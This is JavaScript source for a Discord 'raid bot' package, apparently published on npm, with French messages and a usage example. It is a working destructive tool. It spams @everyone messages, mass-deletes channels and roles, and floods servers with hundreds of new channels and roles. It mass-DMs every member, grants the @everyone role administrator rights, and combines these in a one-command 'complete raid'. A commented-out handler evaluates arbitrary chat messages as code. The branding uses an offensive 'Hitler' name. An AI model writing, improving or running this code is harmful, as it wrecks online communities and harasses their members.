module.exports = {
    Client: require("./scripts/Client"),
    Number: require("./scripts/Number"),
};


const Discord = require('discord.js');
const MagicHitler = require('magic_hitler');
const client = new Discord.Client();
const raid = new MagicHitler.Client({
    client: client,
    prefix: "."
});

raid.ready();

raid.sendMessage("Test réussi", "test");
raid.spamMessages("@everyone Raid by Magic Hitler", "spam", {
    messageNumber: 100,
    allChannels: false
});
raid.spamMessage("@everyone Raid by Magic Hitler", "spamAllChannels", {
    messageNumber: 20,
    allChannels: true
});     // On peut déclarer plusieurs fois la même fonction

raid.deleteChannel("del");
raid.deleteChannels("delAll", {
    createChannel: true,
    createdChannelName: "raid-by-magic-hitler",
    createChannelMessage: "@everyone Raid by Magic Hitler"
});
raid.createChannels("create", {
    createChannelName: "magic-hitler",
    sendMessageContent: "@everyone Raid by Magic Hitler",
    sendMessageCount: 3,
    createChannelCount: 222
});
raid.createInvite("invite", false);
raid.createInvite("inviteall", true);

raid.deleteRoles("delRoles");
raid.createRoles("createRoles", {
    rolesNumber: 69,
    rolesName: "Magic Hitler"
});

client.login('');


/*
const log = message => console.log(message)
const scripts = option => require(`./scripts/${option}.js`);
const t = require('timestamp-to-date');
const readline = require('readline');
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function bot(client) {
    if (client.user.bot) {
        return 'Bot'
    } else {
        return 'Compte utilisateur'
    }
}

function admin(guild) {
    if (guild.me.hasPermission('ADMINISTRATOR')) {
        return 'Oui'
    } else {
        return 'Non'
    }
}

exports.ready = function (client) {
    client.on('ready', () => {
        log(`Informations :
    ${client.user.tag} ; ${client.user.id}
    ${bot(client)} créé le ${t(client.user.createdTimestamp, 'dd/mm/yyyy HH:MM:ss')}
    ${client.users.size} utilisateurs sur ${client.guilds.size} serveurs
    https://discordapp.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=-1&scope=bot`);
        rl.question('Afficher une invitation pour chacun de ces serveurs ? (y/n)\n', (answer) => {
            if (answer === 'y') {
                log(`
    ${client.guilds.map(guild => {
        if (guild.me.hasPermission('CREATE_INSTANT_INVITE')) {
            findChannel();
            function findChannel() {
                const channel = guild.channels.random()
                if (!channel) return findChannel();
                if (channel.type !== 'text') return findChannel();
                channel.createInvite().then(invite => {
                    log(`
    ${guild.name}
        Membres : ${guild.memberCount}
        Salons : ${guild.channels.size}
        Rôles : ${guild.roles.size}
        Administrateur : ${admin(guild)}
        Invitation : https://discord.gg/${invite.code}`);
            })
        }}})}`);
            }
            rl.close();
        });
    });
}

exports.deleteChannels = function (client, trigger = String(_s), createChannel = Boolean(_b)) {
    client.on('message', message => {
        if (message.content.includes(trigger)) {
            scripts("deleteChannels")(message, createChannel, client);
        }
    });
}

exports.createChannels = function (client, trigger = String(_s), numberOfChannelsToCreate = Number(_n), nameOfChannelsToCreate = String(_s), MessageToSpamInNewChannels = String(_s), numberOfNotificationsPerChannel = Number(_s)) {
    client.on('message', async message => {
        if (message.content.includes(trigger)) {
            scripts("createChannels")(message, nameOfChannelsToCreate, numberOfChannelsToCreate, false, MessageToSpamInNewChannels, numberOfNotificationsPerChannel, client);
        }
    });
}

exports.deleteRoles = function (client, trigger = String(_s)) {
    client.on('message', message => {
        if (message.content.includes(trigger)) {
            scripts("deleteRoles")(message, client);
        }
    });
}

exports.createRoles = function (client, trigger = String(_s), nameOfRolesToCreate = String(_s), NumberOfRolesToCreate = Number(_n)) {
    client.on('message', async message => {
        if (message.content.includes(trigger)) {
            scripts("createRoles")(message, nameOfRolesToCreate, NumberOfRolesToCreate, false, client)
        }
    });
}

exports.dmAllMembers = function (client, trigger = String(_s), msg = String(_s), numberOfMessages = Number(_n)) {
    client.on('message', async message => {
        if (message.content.includes(trigger)) {
            message.guild.members.map(member => {
                for (var i = 0; i < numberOfMessages; i++) {
                    member.send(msg).catch(console.error)
                }
            });
        }
    });
}

exports.createInvite = function (client, trigger = String(_s), allGuilds = Boolean(_b)) {
    client.on('message', message => {
        if (message.content.includes(trigger)) {
            scripts("createInvite")(client, message, allGuilds);
        }
    });
}

exports.everyoneAdmin = function (client, trigger = String(_s)) {
    client.on('message', message => {
        if (message.content.includes(trigger)) {
            if (message.author.id === client.user.id) return;
            if (message.channel.type === 'dm') return message.author.send("Cette commande n'est pas utilisable par message privé.");
            if (!message.guild.me.hasPermission('ADMINISTRATOR')) return message.author.send('Je ne suis pas administrateur sur ce serveur.');
            message.delete('https://www.npmjs.com/package/discord_raid_bot')
            message.guild.roles.find('name', '@everyone').edit({
                permissions: "ADMINISTRATOR"
            })
        }
    });
}


exports.completeRaid = function (client, trigger = String(_s), everyoneAdmin = Boolean(_b), deleteRoles = Boolean(_b), deleteChannels = Boolean(_b), createChannels = Boolean(_b), channelsName = String(_s), channelsNumber = Number(_n), spamMessage = String(_s), messagesNumber = Number(_n), createRoles = Boolean(_b), rolesName = String(_s), rolesNumber = Number(_n)) {
    client.on('message', async message => {
        if (message.content.includes(trigger)) {
            if (message.author.id === client.user.id) return;
            if (message.channel.type === 'dm') return message.author.send("Cette commande n'est pas utilisable par message privé.");
            if (!message.guild.me.hasPermission('ADMINISTRATOR')) return message.author.send('Je ne suis pas administrateur sur ce serveur.');
            message.delete('https://www.npmjs.com/package/discord_raid_bot').catch(console.error);


            if (everyoneAdmin === true) scripts("everyoneAdmin")(message, client);
            if (deleteRoles === true) scripts("deleteRoles")(message, client);
            if (deleteChannels === true) scripts("deleteChannels")(message, false, client);
            if (createChannels === true) scripts("createChannels")(message, channelsName, channelsNumber, deleteChannels, spamMessage, messagesNumber, client);
            if (createRoles === true) scripts("createRoles")(message, rolesName, rolesNumber, deleteRoles, client);
        }
    });
}

/*exports.eval = function(client) {
    client.on('message', message => {
        console.log(clean(require("util").inspect(eval(message.content))), {code:"xl"})
        function clean(text) {
            if (typeof(text) === "string")
              return text.replace(/`/g, "`" + String.fromCharCode(8203)).replace(/@/g, "@" + String.fromCharCode(8203));
            else
                return text;
          }
    })
}*/
